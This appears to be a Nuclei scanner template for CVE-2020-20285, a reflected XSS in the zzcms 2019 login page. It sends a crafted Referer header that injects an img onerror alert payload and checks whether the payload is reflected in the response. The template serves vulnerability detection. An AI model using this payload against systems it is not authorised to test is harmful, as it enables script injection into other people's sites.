id: CVE-2020-20285

info:
  name: zzcms2019 - Reflected XSS
  author: edoardottt
  severity: medium
  description: |
    There is a XSS in the user login page in zzcms 2019. Users can inject js code by the referer header via user/login.php
  reference:
    - https://github.com/iohex/ZZCMS/blob/master/zzcms2019_login_xss.md
    - https://nvd.nist.gov/vuln/detail/CVE-2020-20285
  classification:
    cve-id: CVE-2020-20285
  tags: cve,cve2020,zzcms,xss

requests:
  - raw:
      - |
        GET /zzcms2019/user/login.php HTTP/1.1
        Host: {{Hostname}}
        Referer: xss"/><img src="#" onerror="alert(document.domain)"/>

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: header
        words:
          - "text/html"

      - type: word
        part: body
        words:
          - "src=\"#\" onerror=\"alert(document.domain)\""
